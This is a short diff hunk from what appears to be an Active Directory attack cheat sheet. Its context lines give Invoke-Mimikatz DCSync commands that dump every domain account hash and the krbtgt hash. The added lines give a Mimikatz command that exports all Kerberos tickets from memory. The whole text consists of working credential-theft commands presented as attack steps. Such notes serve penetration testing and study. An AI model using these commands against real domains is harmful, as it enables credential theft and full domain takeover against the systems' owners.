@@ -38,3 +38,7 @@ Use the DCSync feature for getting hash
 Invoke-Mimikatz -Command '"lsadump::dcsync /all"'
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 ```
+Export all ticket
+```powershell
+Invoke-Mimikatz –Command '"sekurlsa::tickets /export"'
+```
